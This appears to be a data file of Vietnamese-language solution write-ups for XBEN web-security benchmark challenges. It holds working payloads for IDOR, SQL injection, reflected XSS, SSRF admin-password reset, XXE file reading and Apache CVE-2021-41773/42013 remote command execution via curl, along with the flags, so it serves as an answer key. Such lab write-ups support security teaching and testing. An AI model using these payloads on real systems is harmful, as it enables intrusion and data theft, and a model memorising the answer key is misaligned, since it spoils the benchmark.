XBEN-005-24,1,"IDOR, Default Credentials","[XBEN-005-24] Simple IDOR POST – Elevate to Admin via Parameter Tampering

1. Truy cập trang web tại `http://<IP>:<PORT>/login`. 
Xem page-source thấy username/password mặc định trong DOM: **demo / demo**

2. Đăng nhập bằng demo/demo → được chuyển vào trang chính.

3. Tìm được nút **Edit Profile** (thẻ `<a href=""/edit_profile/1"">`). Đây là dấu hiệu IDOR vì ID được đặt cứng.

4. Bật Burp Suite, bật intercept, click Update Profile để bắt request. Gửi request đó đi ta được response có logic check tham số nếu `is_admin=0` thì là Admin

5. Trong request cũ thêm `&is_admin=0` vào body, rồi gửi lại request.

6. Giữ cookie trong request đó, tạo 1 request đến `/company/1/jobs` với cookie đó. Flag sẽ được hiển thị trong response:
FLAG{c3aa1ce79de44a89c2cc9598777acd4a950aa054f07b5d1efba2669012be883e}"
XBEN-006-24,1,SQLi,"[XBEN-006-24] SQLite Injection – Bypass Logic Check to Access Private Jobs
1. Truy cập trang web tại http://<IP>:<PORT> và quan sát chức năng Job Search gửi POST /jobs với body JSON:
{ ""job_type"": ""<value>"" }

2. Với job_type là private ta nhận status code 403. Qua đó ta thấy server sẽ trả về 403 nếu chuỗi job_type là private

3. Để bypass logic trên ta sẽ tạo 1 chuỗi SQLi: private' -- . Lúc này job type sẽ khác private tuy nhiên khi vào SQL query nó có nghĩa tương đương.

4. Gửi request:
POST /jobs
Content-Type: application/json

{
""job_type"": ""private' -- ""
}

5. Server trả về flag:
FLAG{c3aa1ce79de44a89c2cc9598777acd4a950aa054f07b5d1efba2669012be883e}"
XBEN-013-24,1,XSS,"[XBEN-013-24] Cross 5 – Reflected XSS via Payload Injection

1. Truy cập trang web tại http://<IP>:<PORT>/ và quan sát giao diện. Tại đây có một thẻ <a> dẫn đến trang nhập nội dung.

2. Click vào đường dẫn đó để mở trang chứa ô input nơi dữ liệu được phản chiếu trực tiếp ra HTML.

3. Nhập payload XSS bắt buộc phải chứa chuỗi ""XSS"" in hoa: <iframe/src=//onload=prompt('XSS')> rồi submit.


4. Khi submit, popup XSS xuất hiện, chứng minh khai thác thành công: XSS. Tiếp tục click OK
5. Tìm được flag FLAG{9dc112651b3e7eab656ff31112a87e6f3d08c8e9e1872bc5c042be2bd8604967}"
XBEN-019-24,1,"LFI, Information Disclosure","[XBEN-019-24] Exploit Steps (Short Version)

1. Dirsearch enumerate root

dirsearch -u http://TARGET/ -e js,txt,html,php


Kết quả tìm được:
/static, /javascript, /resource, /login.

2. Kiểm tra /static/flag

http://TARGET/static/flag


Kết quả: 403 Forbidden → file tồn tại.

3. Dùng Burp + JS Param Miner trên trang /login

Burp → Extension: JS Param Miner → “Find hidden parameters”.

Kết quả tìm được request:

/resource?filename=zwrtxqvam61ycxnondxefy8&lo54mlw2zr3=1


→ Xác định param dùng bởi backend: filename

4. Gửi request để đọc file flag qua /resource

http://TARGET/resource?filename=flag


5. Nhận file flag từ server → DONE"
XBEN-020-24,1,SSRF,"[XBEN-020-24] PHP SSRF

Bước 1: Truy cập trang chính của ứng dụng tại http://<IP>:<PORT>/ và quan sát form gửi yêu cầu đến redirect.php với tham số url.

Bước 2: Thử khai thác SSRF bằng cách cho server truy cập dịch vụ nội bộ. Gửi yêu cầu:
http://<IP>:<PORT>/redirect.php?url=http://internal-service

Bước 3: Server sẽ gửi request đến internal-service từ bên trong mạng Docker và trả về nội dung của trang nội bộ.

Bước 4: Nội dung trả về chứa flag trực tiếp. Lấy flag từ response.
"
XBEN-024-24,1,SSRF,"[XBEN-024-24] Profile Picture – SSRF to Reset Admin Password

1. Truy cập http://<IP>:<PORT>/login, view page-source thấy comment liệt kê các endpoint:
- /register
- /login
- /profile (có profile_picture_url)
- /reset_password (chỉ cho localhost, có param username & newpassword)

2. Truy cập /register, tạo tài khoản user thường (ví dụ: test / test123!).

3. Đăng nhập bằng tài khoản vừa tạo, hệ thống redirect sang /profile.

4. Tại /profile, chú ý field “Or Profile Picture URL” (profile_picture_url).

5. Nhập payload SSRF vào profile_picture_url:
http://127.0.0.1/reset_password?username=admin&newpassword=Admin123!

6. Bật Burp, bấm Save để gửi POST /profile, xác nhận body chứa:
profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=Admin123!

7. Forward request, backend sẽ tự gọi localhost và reset password user admin.

8. Logout, quay lại /login và đăng nhập:
username: admin
password: Admin123!

9. Sau khi login thành công, truy cập /profile và lấy flag:

FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c90103ed63ec23a5e2d}

=> Khai thác thành công SSRF thông qua profile_picture_url để bypass giới hạn localhost và chiếm quyền admin.
"
XBEN-026-24,1,"CVE, Path Traversal, LFI","[XBEN-026-24] Deprecated Developers
1) Truy cập web thấy server chạy Apache/2.4.50 → thuộc phiên bản dính CVE-2021-42013 (path traversal + RCE).

2) Thử khai thác RCE bằng payload double-encoded traversal:
curl --path-as-is -d 'echo; id' \
http://192.168.111.136:32772/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
→ nhận được uid=daemon → RCE thành công.

3) Liệt kê thư mục root để tìm flag:
curl --path-as-is -d 'echo; ls -al /' \
http://192.168.111.136:32772/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
→ thấy file /FLAG.txt

4) Đọc nội dung flag:
curl --path-as-is -d 'echo; cat /FLAG.txt' \
http://192.168.111.136:32772/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh

5) Nhận được:
FLAG{a6ac61a12b93104de3b7a7db781ee95eff75310de4cf2deb1e90b57f0c824309}"
XBEN-031-24,1,"CVE, Path Traversal, Command Injection","[XBEN-031-24] Apache CGI Path Traversal
1. Dùng dirsearch quét webserver → phát hiện thư mục /cgi-bin và thấy các script printenv, test-cgi trả về 500, cho thấy CGI đang bật.
2. Thử truy cập /cgi-bin/.%2e/.../etc/passwd → server trả về lỗi 500 nhưng phản hồi kích thước đúng với lỗi Apache khi path traversal thành công → xác nhận lỗ hổng CVE-2021-41773.
3. Sử dụng payload CVE-2021-41773 để thực thi lệnh thông qua /bin/sh:
http://TARGET/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
4. Liệt kê thư mục /tmp theo hint:
curl --path-as-is -d ""echo; ls -al /tmp"" http://TARGET/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
5. Phát hiện file flag nằm tại /tmp/flag.
6. Đọc flag bằng RCE:
curl --path-as-is -d ""echo; cat /tmp/flag"" http://TARGET/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
7. Nhận flag:
FLAG{17565f0164e2939bd47fc7be82b531721862de31110439e7223e850695866607}"
XBEN-032-24,1,"XXE
Default Credentials","[XBEN-032-24 Nice SOAP - XXE + Default Credentials]

1. Initial Access – Default Credentials
- Trang login cho phép đăng nhập bằng username và password.
- Trong mô tả challenge có hint: ""John's password is 'password123'"".
- Tiến hành đăng nhập với:
+ Username: john
+ Password: password123
- Đăng nhập thành công và truy cập được dashboard.

2. Discover SOAP/XML Endpoint
- Bật Burp Proxy và theo dõi request sau khi thao tác trong dashboard.
- Phát hiện request XML gửi tới endpoint:
POST /soap_service
Content-Type: application/xml
- Body gốc:
<GetAccountInfoRequest>
<account_id>123456</account_id>
</GetAccountInfoRequest>
- Response trả về thông tin tài khoản → xác định đây là SOAP-like XML service.

3. XXE Exploitation
- Mục tiêu: đọc file /app/flag.txt bằng XXE.
- Tiến hành chèn DOCTYPE và ENTITY để đọc file local.
- Payload gửi qua Burp Repeater:

POST /soap_service HTTP/1.1
Host: 192.168.111.136:32769
Content-Type: application/xml
Cookie: session=eyJ1c2VybmFtZSI6ImpvaG4ifQ.aS1tZw.YQbPtDesFH2csvGcXLv_wwQ3M64
Connection: close

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM ""file:///app/flag.txt"">
]>
<GetAccountInfoRequest>
<account_id>&xxe;</account_id>
</GetAccountInfoRequest>

4. Result
- Server parse XML và resolve external entity thành công.
- Response trả về nội dung file /app/flag.txt trong field <account_id>:

FLAG{197ab91b89d9d6d8d25c0675bde52e082b7f03ba43d9aeebd9e55e390a10ec1d}

5. Conclusion
- Lỗi bảo mật gồm:
+ Default credentials (john/password123)
+ XML External Entity (XXE) Injection
- Cho phép attacker đọc file tuỳ ý trên server và lấy flag thành công.

[END]
"
XBEN-033-24,1,SSRF,"XBEN-033-24 – Tóm gọn các bước khai thác: Truy cập trang chính “Markdown to HTML Converter” thấy form POST tới /convert có tham số url → nghi ngờ SSRF. Dùng dirsearch brute-force tìm được endpoint /admin nhưng truy cập trực tiếp trả về 403 → xác nhận admin chỉ cho phép từ localhost. Tiếp theo lợi dụng SSRF, gửi POST /convert với payload url=http://127.0.0.1/admin để server tự request nội bộ → bypass thành công restriction và hiển thị giao diện Admin Panel. Sau đó tiếp tục SSRF tới endpoint chứa flag bằng payload url=http://127.0.0.1/admin/flag → server truy cập nội bộ và trả về flag trong phần result của /convert. Flag thu được: FLAG{9a23b34477e5d66152607b8bf6cb296638ac520b70d4dd1f2f01326c6548a8c2}.
"
